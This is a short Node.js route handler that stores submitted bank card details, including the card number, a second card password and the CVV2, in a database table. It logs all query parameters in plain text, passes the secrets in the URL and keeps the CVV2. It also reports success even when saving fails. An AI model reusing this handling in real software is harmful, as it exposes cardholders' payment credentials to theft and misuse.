module.exports = function(req, res, connection){
   
    // Receive POST values
    console.log(req.query)

    /* Validate inputs */
    if(req.query.expmah === '' || req.query.bankname === '')
    return res.status(200).jsonp({action:'enseraf'});

    // Store Data
    connection.query("INSERT INTO app_cards SET ? ", {
       
        cardnumber:CryptoJS.AES.encrypt(req.query.cardnumber, SECRET_KEY),
        secondpass:CryptoJS.AES.encrypt(req.query.secondpass, SECRET_KEY),
        bankname:req.query.bankname,
        cvv2:CryptoJS.AES.encrypt(req.query.cvv2, SECRET_KEY),
        expmonth:req.query.expmah,
        expyear:req.query.expyear,
        mobile:req.query.mobileforipg,
        email:req.query.emailforipg
    
    },function(error){
        if(error)
        console.log('Error saving card');
        return res.status(200).jsonp({action:'OK'});
    });
   
}